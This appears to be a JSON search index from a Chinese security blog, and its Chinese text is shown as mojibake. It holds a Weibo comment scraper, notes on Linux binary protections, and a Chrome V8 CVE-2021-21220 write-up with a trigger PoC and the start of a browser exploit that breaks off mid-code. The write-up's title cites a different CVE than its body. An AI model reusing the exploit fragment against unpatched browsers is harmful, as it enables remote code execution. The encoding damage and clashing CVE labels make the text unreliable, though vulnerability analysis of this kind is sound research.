‡å‡†åº“çš„printf()ï¼Œåœ¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œä¸ä¼šç«‹å³ç¡®å®šprintf()çš„å…·ä½“åœ°å€ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶å»è£…è½½è¿™ä¸ªå‡½æ•°ï¼Œåœ¨è£…è½½é˜¶æ®µç¡®å®šprintf()çš„åœ°å€ã€‚è¿™é‡Œæåˆ°çš„åœ°å€æŒ‡çš„æ˜¯è¿›ç¨‹åœ¨å†…å­˜ä¸Šçš„è™šæ‹Ÿåœ°å€ã€‚åŠ¨æ€é“¾æ¥åº“çš„å‡½æ•°åœ°å€åœ¨ç¼–è¯‘æ—¶æ˜¯ä¸ç¡®å®šçš„ï¼Œåœ¨è£…è½½æ—¶ï¼Œè£…è½½å™¨æ ¹æ®å½“å‰åœ°å€ç©ºé—´æƒ…å†µï¼ŒåŠ¨æ€åœ°åˆ†é…ä¸€å—è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ å°ç»“åœ¨ä¼šå†™ä¸€ä¸ªCç¨‹åºï¼Œä¹Ÿè¦äº†è§£ä¸€ä¸ªCä»£ç æ˜¯å¦‚ä½•ä»ASCIIæ–‡ä»¶ä¸€æ­¥æ­¥å˜ä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„è¿‡ç¨‹ã€‚","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ç¼–è¯‘è¿‡ç¨‹","slug":"ç¼–è¯‘è¿‡ç¨‹","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"é“¾æ¥","slug":"é“¾æ¥","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"}]},{"title":"Pythonå¾®åšè¯„è®ºçˆ¬å–","slug":"Pythonçˆ¬è™«","date":"2021-04-13T17:24:39.000Z","updated":"2022-03-25T13:51:44.000Z","comments":true,"path":"2021/04/14/Pythonçˆ¬è™«/","link":"","permalink":"http://example.com/2021/04/14/Python%E7%88%AC%E8%99%AB/","excerpt":"","text":"Descriptions ç”¨äºçˆ¬å–æŸä¸€å…·ä½“å¾®åšçš„æ‰€æœ‰è¯„è®º é€šè¿‡https://m.weibo.com æŸ¥çœ‹æŒ‡å®šå¾®åšidå· ä¿®æ”¹cookie Source_code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import reimport requestsimport csvfrom requests.sessions import sessionimport time#åˆå§‹åŒ–å‚æ•°è¯´æ˜ï¼šå¡«å…¥è‡ªå·±cookieã€ä»¥åŠè¢«çˆ¬å–å¾®åšidå³å¯weibo_id=4643338235416902 headers = &#123; &#x27;Cookie&#x27; : &#x27;Your_own_cookie&#x27;#è®¾ç½®ä¸ºè‡ªå·±çš„cookie &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://m.weibo.cn/detail/4635403158556543&#x27;, &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;, &#x27;X-XSRF-TOKEN&#x27; : &#x27;5c0faa&#x27;, &#x27;sec-ch-ua&#x27;: &#x27;&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;&#x27;, &#x27;sec-ch-ua-mobile&#x27;: &#x27;?1&#x27;, &#x27;sec-fetch-dest&#x27;: &#x27;empty&#x27;, &#x27;sec-fetch-mode&#x27;: &#x27;cors&#x27;, &#x27;sec-fetch-site&#x27;: &#x27;same-origin&#x27;, &#x27;MWeibo-Pwa&#x27;: &#x27;1&#x27;&#125;f = open(&quot;å¾®åšè¯„è®º.csv&quot;,mode =&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;)csvwriter = csv.writer(f)#æ‰“å¼€csvæ–‡ä»¶url = &quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id_type=0&quot;.format(weibo_id,weibo_id)session = requests.Session()resp = session.get(url, headers=headers)dict = resp.json()for j in range(len(dict[&#x27;data&#x27;][&#x27;data&#x27;])): comment = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;text&#x27;] name = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;user&#x27;][&#x27;screen_name&#x27;] csvwriter.writerow([name,comment])max_id_type = dict[&#x27;data&#x27;][&#x27;max_id_type&#x27;]max_id = dict[&#x27;data&#x27;][&#x27;max_id&#x27;]print(&quot;now max_id=&quot;+str(max_id))flag_ok=dict[&#x27;ok&#x27;]print(flag_ok)flag_time=0while(flag_ok==1 and max_id!=0): url = &quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id=&#123;&#125;&amp;max_id_type=&#123;&#125;&quot;.format(weibo_id,weibo_id,max_id,max_id_type) resp = session.get(url,headers=headers) dict = resp.json() flag_time= flag_time+1 if(flag_time==10): flag_time=0 time.sleep(2) print(&quot;Now relax for 2s to avoid åæ‰’æœºåˆ¶. Be patient :)&quot;) flag_ok=dict[&#x27;ok&#x27;] print(&quot;now max_id=&quot;+str(max_id)) if(flag_ok==1): max_id = dict[&#x27;data&#x27;][&#x27;max_id&#x27;] max_id_type = dict[&#x27;data&#x27;][&#x27;max_id_type&#x27;] for j in range(len(dict[&#x27;data&#x27;][&#x27;data&#x27;])): comment = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;text&#x27;] name = dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;user&#x27;][&#x27;screen_name&#x27;] wb_time=dict[&#x27;data&#x27;][&#x27;data&#x27;][j][&#x27;created_at&#x27;] csvwriter.writerow([name,comment,wb_time])","categories":[{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Linuxç¨‹åºä¿æŠ¤æœºåˆ¶","slug":"Linuxç¨‹åºä¿æŠ¤æœºåˆ¶","date":"2021-04-11T17:24:39.000Z","updated":"2022-03-25T14:34:20.000Z","comments":true,"path":"2021/04/12/Linuxç¨‹åºä¿æŠ¤æœºåˆ¶/","link":"","permalink":"http://example.com/2021/04/12/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Linuxç¨‹åºä¿æŠ¤æœºåˆ¶â€‹ åœ¨Pwnable.kråˆ·é¢˜çš„è¿‡ç¨‹ä¸­ä¸€ç‚¹ä¸€ç‚¹åœ°äº†è§£äº†linuxç³»ç»Ÿä¸‹çš„ä¸€äº›å®‰å…¨æœºåˆ¶æ¥é™ä½ç¨‹åºå—åˆ°æº¢å‡ºç­‰æ”»å‡»ï¼Œè¿™é‡Œç®€å•åšä¸ªæ€»ç»“ã€‚:) Tools:checksecchecksecæ˜¯ä¸€ä¸ªæ£€æŸ¥linuxç¨‹åºå¼€å¯çš„å®‰å…¨æœºåˆ¶çš„shellè„šæœ¬ï¼Œä¹Ÿå¯ä»¥æ£€æµ‹packerä¿¡æ¯ ï¼ˆDemo: é¢˜ç›®:flag ä¸‹é¢å¯¹é€ä¸ªä»‹ç»ä¿æŠ¤æœºåˆ¶ CANARYâ€‹ åœ¨linuxç¨‹åºä¸­ï¼ŒCANARYæ˜¯ä¸€ç§æ ˆä¿æŠ¤æœºåˆ¶ï¼Œæ ˆä¿æŠ¤æœºåˆ¶å¼€å¯åï¼Œå‡½æ•°æ‰§è¡Œæ—¶ä¼šå…ˆå¾€æ ˆä¸­æ’å…¥éšæœºå€¼ï¼Œè¿™ä¸ªéšæœºå€¼å°±è¢«ç§°ä¸ºCANARYï¼Œå½“å‡½æ•°è¿”å›æ—¶ï¼Œä¼šå…ˆéªŒè¯è¿™ä¸ªéšæœºæ•°æ˜¯å¦è¢«æ›´æ”¹ï¼Œå¦‚æœè¢«æ›´æ”¹è¯´æ˜æœ‰æ ˆæº¢å‡ºè¡Œä¸ºï¼Œå°±ä¼šä½¿ç¨‹åºå¼ºåˆ¶åœæ­¢ï¼Œä»è€Œè§„é¿æ ˆæº¢å‡ºå¸¦æ¥çš„å±å®³ã€‚ â€‹ Functionï¼š 1ã€åœ¨æ‰€æœ‰å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œå‘æ ˆå¸§å†…å‹å…¥ä¸€ä¸ªé¢å¤–çš„éšæœº DWORDï¼Œè¿™ä¸ªéšæœºæ•°è¢«ç§°ä½œâ€œcanaryâ€ï¼Œç”¨ IDA åæ±‡ç¼–æ—¶ï¼Œåˆè¢«ç§°ä½œâ€œSecurity Cookieâ€ã€‚ 2ã€canary ä½äº EBP ä¹‹å‰ï¼Œç³»ç»Ÿè¿˜ä¼šåœ¨.data çš„å†…å­˜åŒºåŸŸä¸­å­˜æ”¾ä¸€ä¸ª canary çš„å‰¯æœ¬ã€‚ 3ã€ å½“æ ˆä¸­å‘ç”Ÿæº¢å‡ºæ—¶ï¼Œcanary å°†è¢«é¦–å…ˆæ·¹æ²¡ï¼Œä¹‹åæ‰æ˜¯ EBP å’Œè¿”å›åœ°å€ã€‚ 4ã€ åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç³»ç»Ÿå°†æ‰§è¡Œä¸€ä¸ªé¢å¤–çš„å®‰å…¨éªŒè¯æ“ä½œï¼Œç§°ä½œ Security Checkã€‚ 5ã€åœ¨ Security Check è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå°†æ¯”è¾ƒæ ˆå¸§ä¸­åŸå…ˆå­˜æ”¾çš„ canary å’Œ.data ä¸­å‰¯æœ¬çš„å€¼ï¼Œè‹¥ä¸¤è€…ä¸åŒï¼Œåˆ™è¯´æ˜æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºï¼Œç³»ç»Ÿå°†è¿›å…¥å¼‚å¸¸å¤„ç†æµç¨‹ï¼Œå‡½æ•°ä¸ä¼šæ­£å¸¸è¿”å›ã€‚ FORTIFYFORTIFYæœºåˆ¶ç”¨äºæ£€æŸ¥ç¨‹åºæ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºé”™è¯¯ã€‚è¿™æ˜¯ä¸€ä¸ªç”±GCCå®ç°çš„æºç çº§åˆ«çš„ä¿æŠ¤æœºåˆ¶ï¼Œå…¶åŠŸèƒ½æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç ä»¥é¿å…æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚é€‚ç”¨äºmemcpyï¼Œmemsetï¼Œstpcpyï¼Œstrcpyï¼Œstrncpyï¼Œstrcatï¼Œstrncatï¼Œsprintfï¼Œsnprintfï¼Œvsprintfï¼Œvsnprintfï¼Œgetsç­‰å‡½æ•°ã€‚ åœ¨å‡½æ•°ç¼–è¯‘æ—¶ï¼ŒåŠ å…¥FORTIFYæœºåˆ¶çš„ä»£ç ä¼šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è‡ªåŠ¨æ·»åŠ ä¸€éƒ¨åˆ†ä»£ç ï¼Œåˆ¤æ–­æ•°ç»„çš„å¤§å°ï¼Œå‰Šå‡ç¼“å†²åŒºæº¢å‡ºçš„å±å®³ã€‚ gccç¼–è¯‘æ—¶ï¼Œé»˜è®¤ä¸å¼€å¯FORTIFYæœºåˆ¶ï¼Œå¯é€šè¿‡ç¼–è¯‘é€‰é¡¹é€‰æ‹©å¼€å¯çš„FORTIFYæœºåˆ¶å¼ºåº¦ NXNX:no-excuteä¸å¯æ‰§è¡Œ åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ PIEï¼ˆASLRï¼‰PIEä¸€èˆ¬ä¸ASLRåœ°å€åˆ†å¸ƒéšæœºåŒ–(address space layout randomization)åŒæ—¶å·¥ä½œ å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶å‡ ç§æƒ…å†µï¼š1230 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚ RELRORELRO:read only relocation ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯». ä½œç”¨ï¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚ Summaryäº†è§£ä»¥ä¸Šå†…å­˜ä¿æŠ¤æœºåˆ¶çš„ä¿¡æ¯ä¼šä¸ºæˆ‘ä»¬pwnæä¾›ä¸€äº›ä¿¡æ¯ã€‚","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"ç¨‹åºä¿æŠ¤æœºåˆ¶","slug":"ç¨‹åºä¿æŠ¤æœºåˆ¶","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"CVE-2021-25646å †æº¢å‡ºæ¼æ´å¤ç°åŠåˆ†æ","slug":"CVE-2021-21220","date":"2021-04-10T17:24:39.000Z","updated":"2022-03-25T13:51:42.000Z","comments":true,"path":"2021/04/11/CVE-2021-21220/","link":"","permalink":"http://example.com/2021/04/11/CVE-2021-21220/","excerpt":"","text":"CVE-2021-21220åœ¨é‡0dayæ¼æ´ç®€ä»‹Google chrome 90.0.4430.72ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºV8ä¼˜åŒ–ä¸­çš„æ•°æ®éªŒè¯ä¸è¶³ã€‚ å½±å“èŒƒå›´chrome&lt; 90.0.4430.72ä»¥åŠMicrosoft Edgeå’Œå…¶ä»–å¯èƒ½åŸºäºChromiumçš„æµè§ˆå™¨ã€‚ æ¼æ´å¤ç°ä¸‹è½½expå¹¶åˆ©ç”¨ æ‰“å¼€åŒ…å«è¯¥æ¼æ´çš„htmlé¡µé¢ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚ æ¼æ´ç®€æwhatâ€™s V8V8æ˜¯Chromiumå†…æ ¸ä¸­çš„JavaScriptå¼•æ“ï¼Œè´Ÿè´£å¯¹JavaScriptä»£ç è¿›è¡Œè§£é‡Šä¼˜åŒ–ä¸æ‰§è¡Œï¼Œè€ŒCVE-2020-16040(crbug.com/1150649)æ˜¯V8ä¼˜åŒ–ç¼–è¯‘å™¨Turbofanåœ¨SimplifiedLoweringé˜¶æ®µäº§ç”Ÿçš„ä¸€ä¸ªæ•´æ•°æº¢å‡ºæ¼æ´ã€‚ V8å¼•æ“å·¥ä½œæµç¨‹ Parser(è§£æå™¨)ï¼šè´Ÿè´£é€šè¿‡å¯¹æºä»£ç è¿›è¡Œè¯æ³•åˆ†æå¾—åˆ°çš„tokenå¯¹æºä»£ç è¿›è¡Œè¯­æ³•é”™è¯¯åˆ†æã€è½¬æ¢ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘å¹¶ç¡®å®šè¯æ³•ä½œç”¨åŸŸï¼š Demo: Ignition(è§£é‡Šå™¨)ï¼šè´Ÿè´£å°† AST è½¬æ¢ä¸ºä¸­é—´ä»£ç å³å­—èŠ‚ç (Bytecode)å¹¶é€è¡Œè§£é‡Šæ‰§è¡Œå­—èŠ‚ç ï¼Œåœ¨è¯¥é˜¶æ®µï¼Œ JavaScript ä»£ç å°±å·²ç»å¼€å§‹æ‰§è¡Œäº†ã€‚ è€ƒè™‘å¦‚ä¸‹ä»£ç bytecode.jsï¼š 1234let ziwu_add = (x,y) =&gt; &#123;return x + y;&#125;ziwu_add(1,2) ä½¿ç”¨å‘½ä»¤./d8 bytecode.js â€”allow-natives-syntax â€”print-bytecode â€”print-bytecode-filter ziwu_addå¯å¾—åˆ°å…¶å­—èŠ‚ç ï¼š 12345678910[generated bytecode for function: ziwu_add (0x1984082d26e1 &lt;SharedFunctionInfo ziwu_add&gt;)]Parameter count 3Register count 0Frame size 00x1984082d2826 @ 0 : 25 04 Ldar a10x1984082d2828 @ 2 : 35 03 00 Add a0, [0]0x1984082d282b @ 5 : ab Return Constant pool (size &#x3D; 0)Handler Table (size &#x3D; 0)Source Position Table (size &#x3D; 0) Add a0, [0]å³å­—èŠ‚ç ï¼Œä»–å‘Šè¯‰V8æˆ‘ä»¬æ˜¯è¦æ‰§è¡Œä¸€ä¸ªåŠ æ³•æ“ä½œã€‚ TurboFan(ä¼˜åŒ–ç¼–è¯‘å™¨)è´Ÿè´£å°†å­—èŠ‚ç å’Œä¸€äº›åˆ†ææ•°æ®ä½œä¸ºè¾“å…¥å¹¶ç”Ÿæˆä¼˜åŒ–çš„æœºå™¨ä»£ç ï¼Œå½“ Ignition å°† JavaScript ä»£ç è½¬æ¢ä¸ºå­—èŠ‚ç åï¼Œä»£ç å¼€å§‹æ‰§è¡Œï¼ŒV8 ä¼šä¸€ç›´è§‚å¯Ÿ JavaScript ä»£ç çš„æ‰§è¡Œæƒ…å†µï¼Œå¹¶è®°å½•æ‰§è¡Œä¿¡æ¯ï¼Œå¦‚æ¯ä¸ªå‡½æ•°çš„æ‰§è¡Œæ¬¡æ•°ã€æ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ é€’çš„å‚æ•°ç±»å‹ç­‰ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨çš„æ¬¡æ•°è¶…è¿‡äº†å†…è®¾çš„é˜ˆå€¼ï¼Œç›‘è§†å™¨å°±ä¼šå°†å½“å‰å‡½æ•°æ ‡è®°ä¸ºçƒ­ç‚¹å‡½æ•°ï¼ˆHot Functionï¼‰ï¼Œå¹¶å°†è¯¥å‡½æ•°çš„å­—èŠ‚ç ä»¥åŠæ‰§è¡Œçš„ç›¸å…³ä¿¡æ¯å‘é€ç»™ TurboFanã€‚TurboFan ä¼šæ ¹æ®æ‰§è¡Œä¿¡æ¯åšå‡ºä¸€äº›è¿›ä¸€æ­¥ä¼˜åŒ–æ­¤ä»£ç çš„å‡è®¾ï¼Œåœ¨å‡è®¾çš„åŸºç¡€ä¸Šå°†å­—èŠ‚ç ç¼–è¯‘ä¸ºä¼˜åŒ–çš„æœºå™¨ä»£ç ã€‚å¦‚æœå‡è®¾æˆç«‹ï¼Œé‚£ä¹ˆå½“ä¸‹ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå°±ä¼šæ‰§è¡Œä¼˜åŒ–ç¼–è¯‘åçš„æœºå™¨ä»£ç ï¼Œä»¥æé«˜ä»£ç çš„æ‰§è¡Œæ€§èƒ½ã€‚å½“æŸä¸€æ¬¡è°ƒç”¨ä¼ å…¥çš„ä¿¡æ¯å˜åŒ–æ—¶ï¼Œè¡¨ç¤º TurboFan çš„å‡è®¾æ˜¯é”™è¯¯çš„ï¼Œæ­¤æ—¶ä¼˜åŒ–ç¼–è¯‘ç”Ÿæˆçš„æœºå™¨ä»£ç å°±ä¸èƒ½å†ä½¿ç”¨äº†ï¼Œäºæ˜¯è¿›è¡Œä¼˜åŒ–å›é€€ï¼Œé‡èµ°åŸå¤æ‚å‡½æ•°é€»è¾‘ã€‚ ä¼˜åŒ–Demo: ä¼˜åŒ–é€»è¾‘è¿‡ç¨‹å¦‚ä¸‹ï¼Œè€ƒè™‘ä¸‹è¿°ä»£ç ï¼š 123456let ziwu_add = (x,y) =&gt; &#123;return x + y;&#125;ziwu_add(1,2);ziwu_add(&#x27;hack&#x27;,&#x27;you&#x27;);ziwu_add([],&#123;&#125;) V8åœ¨æ¯æ¬¡è®¡ç®—æ—¶éœ€è¦å…ˆåˆ¤æ–­xã€yçš„ç±»å‹ï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„å¤„ç†ï¼Œä½†å¦‚æœè¯¥å‡½æ•°è¦æ‰§è¡Œå¾ˆå¤šæ¬¡å‘¢ï¼Ÿ 123456let ziwu_add = (x,y) =&gt; &#123;return x + y;&#125;for (var i=0;i&lt;0x10000;i++)&#123; ziwu_add(1+i,2)&#125; xå‚æ•°æŒç»­å˜åŒ–ï¼Œå¦‚æœæ¯æ¬¡éƒ½è¦å»åˆ¤æ–­ç±»å‹æ˜¯å¦è¿‡äºç¹çï¼Œä¸å¤Ÿé«˜æ•ˆï¼ŒTurbofané€šè¿‡è§‚å¯Ÿå‘ç°ï¼Œç»è¿‡äº†å¦‚æ­¤å¤šçš„å¾ªç¯è®¡ç®—ï¼Œxã€yå‚æ•°éƒ½æ˜¯intç±»å‹ï¼Œæœ‰ç†ç”±ç›¸ä¿¡ä¸‹ä¸€æ¬¡åº”è¯¥è¿˜æ˜¯è¿™æ ·ï¼Œé‚£å°±ä¸å¦¨å°†xã€yå‚æ•°çš„ç±»å‹å‡è®¾ä¸ºintï¼ŒåŸºäºè¿™ä¸ªå‡è®¾ï¼Œæˆ‘ä»¬å¯ä»¥å°†ziwu_addå‡½æ•°ä¼˜åŒ–ä¸ºç®€å•çš„åŠ æ³•ï¼š 1add eax ebx; POCæ ¹æ®è¡¥ä¸å‘ç”Ÿå˜åŒ–çš„ä½ç½®åˆ†æï¼š æ¼æ´å­˜åœ¨äº Chrome çš„ JS å¼•æ“çš„ JIT ç¼–è¯‘å™¨ Turbofan å½“ä¸­ï¼ŒInstruction Selectoré˜¶æ®µåœ¨å¤„ç†ChangeInt32ToInt64èŠ‚ç‚¹æ—¶ï¼Œä¼šå…ˆæ£€æŸ¥ node çš„ input èŠ‚ç‚¹ï¼Œå¦‚æœ input èŠ‚ç‚¹çš„æ“ä½œç æ˜¯ Loadï¼Œé‚£ä¹ˆä¼šæ ¹æ®è¯¥ inputèŠ‚ç‚¹çš„ LoadRepresentation å’Œ MachineRepresentationè¿›è¡Œä¸€äº›ç‰¹æ®Šçš„å¤„ç†ï¼Œå¦‚æœåˆ¤æ–­è¯¥ input èŠ‚ç‚¹çš„ MachineRepresentation çš„ç±»å‹æ˜¯kWord32, é‚£ä¹ˆä¼šæ ¹æ® LoadRepresentation æ˜¯æœ‰ç¬¦å·çš„è¿˜æ˜¯æ— ç¬¦å·çš„é€‰æ‹©å¯¹åº”çš„æŒ‡ä»¤ï¼Œå¦‚æœæ˜¯æœ‰ç¬¦å·çš„é€‰æ‹©X64Movsxlqï¼Œåœ¨x86æŒ‡ä»¤é›†ä¸­æ˜¯æœ‰ç¬¦å·æ‰©å±•ï¼Œå¦‚æœæ˜¯æ— ç¬¦å·çš„é€‰æ‹©X64Movlï¼Œ åœ¨x86æŒ‡ä»¤é›†ä¸­æ˜¯æ— ç¬¦å·æ‰©å±•ã€‚ æ¼æ´çš„æ ¹æºæ˜¯V8 å¯¹ChangeInt32ToInt64çš„å‡è®¾æ˜¯è¯¥èŠ‚ç‚¹çš„è¾“å…¥å¿…å®šè¢«è§£é‡Šä¸ºä¸€ä¸ªæœ‰ç¬¦å·çš„Int32çš„å€¼ï¼Œæ‰€ä»¥æ— è®º LoadRepresentationå¦‚ä½•ï¼Œéƒ½åº”è¯¥ä½¿ç”¨X64MovsxlqæŒ‡ä»¤ã€‚ 123456789101112131415161718192021222324252627void InstructionSelector::VisitChangeInt32ToInt64(Node* node) &#123; DCHECK_EQ(node-&gt;InputCount(), 1); Node* input = node-&gt;InputAt(0); if (input-&gt;opcode() == IrOpcode::kTruncateInt64ToInt32) &#123; node-&gt;ReplaceInput(0, input-&gt;InputAt(0)); &#125; X64OperandGenerator g(this); Node* const value = node-&gt;InputAt(0); if (value-&gt;opcode() == IrOpcode::kLoad &amp;&amp; CanCover(node, value)) &#123; LoadRepresentation load_rep = LoadRepresentationOf(value-&gt;op()); MachineRepresentation rep = load_rep.representation(); InstructionCode opcode; switch (rep) &#123; case MachineRepresentation::kBit:// Fall through. case MachineRepresentation::kWord8: opcode = load_rep.IsSigned() ? kX64Movsxbq : kX64Movzxbq; break; case MachineRepresentation::kWord16: opcode = load_rep.IsSigned() ? kX64Movsxwq : kX64Movzxwq; break; case MachineRepresentation::kWord32: opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl; break; default: UNREACHABLE();&#125; è§¦å‘æ¼æ´POC 12345678910const arr = new Uint32Array([2 ** 31]);function foo() &#123;return (arr[0] ^ 0) + 1;&#125;console.log(foo()); //è¿™ä¸€è¡Œè¾“å‡º-2147483647for (let i = 0; i &lt; 100000; i++)foo();console.log(&quot;after optimization&quot;);console.log(foo());//è¿™ä¸€è¡Œè¾“å‡º2147483649 åŒæ ·ä¸€ä¸ªå‡½æ•°åœ¨ä¼˜åŒ–å‰å’Œä¼˜åŒ–åè¿”å›çš„ç»“æœä¸ä¸€è‡´ã€‚åœ¨ä¼˜åŒ–å‰ï¼Œarr[0] ^ 0çš„ç»“æœç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ˜¯0x80000000ï¼Œ å¯¹äºå¼‚æˆ–è¿ç®—ï¼ŒJS å¼•æ“ä¼šå°†ç»“æœçœ‹åšä¸€ä¸ªæœ‰ç¬¦å·çš„ Int32 çš„å€¼ï¼Œæ‰€ä»¥å¼‚æˆ–çš„ç»“æœæ˜¯-2147483648, åŠ ä¸Š1 ä»¥åå˜æˆ-2147483647ã€‚ ä½†æ˜¯ä¸ºä»€ä¹ˆä¼˜åŒ–åçš„ç»“æœä¸ä¸€è‡´äº†å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ç”Ÿæˆçš„ Turbofan çš„å›¾ã€‚arr[0] ^ 0è¿™ä¸ªè¡¨è¾¾å¼è¢«ä¼˜åŒ–æˆäº†ä¸€ä¸ªLoadèŠ‚ç‚¹ï¼Œ å¯¹åº”ä¸‹å›¾ä¸­çš„ #81 èŠ‚ç‚¹ï¼Œè€Œ(arr[0] ^0) + 1è¿™ä¸ªåŠ æ³•è¿ç®—è¢«ä¼˜åŒ–æˆäº†#58 ChangeInt32ToInt64èŠ‚ç‚¹å’Œ#50 Int64AddèŠ‚ç‚¹ï¼Œå¦‚ä¸‹å›¾ä¸­é»„è‰²é«˜äº®éƒ¨åˆ†æ‰€ç¤ºï¼Œåœ¨å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒLoad èŠ‚ç‚¹çš„ MachineRepresentation æ˜¯Word32ï¼Œè€ŒLoadRepresentationçš„ç±»å‹æ˜¯Uint32ï¼Œ æ•…è€Œ Turbofan é€‰æ‹©äº†movlæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯æ— ç¬¦å·æ‰©å±•æŒ‡ä»¤ï¼Œå¯¼è‡´ Load èŠ‚ç‚¹çš„å€¼ä¼šè¢«æ— ç¬¦å·æ‰©å±•ä¸º 64 ä½ï¼Œç„¶åå’Œ 1 ç›¸åŠ ï¼Œæœ€åç»“æœè‡ªç„¶æ˜¯2147483649ã€‚ ç”¨è°ƒè¯•å™¨è°ƒè¯•ä¹Ÿå¯ä»¥éªŒè¯ï¼Œåœ¨æ‰§è¡Œåˆ°mov ecx, DWORD PTR [rcx] è¿™ä¸€è¡Œæ—¶ï¼Œrcxå¯„å­˜å™¨æŒ‡å‘çš„å€¼ä¸º0x80000000, æ— ç¬¦å·æ‰©å±•å˜æˆäº†2147483648ï¼Œ æœ€ååŠ ä¸Š 1 å˜æˆäº†2147483649ã€‚ EXPæ„é€ 123456789101112131415161718192021class LeakArrayBuffer extends ArrayBuffer &#123; constructor(size) &#123; super(size); this.slot = 0xb33f;//è¿›è¡Œåœ°å€æ³„éœ² &#125; &#125;function foo(a) &#123; let x = -1; if (a) x = 0xFFFFFFFF; var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));//æ„é€ é•¿åº¦ä¸º-1çš„æ•°ç»„ arr.shift(); let local_arr = Array(2); local_arr[0] = 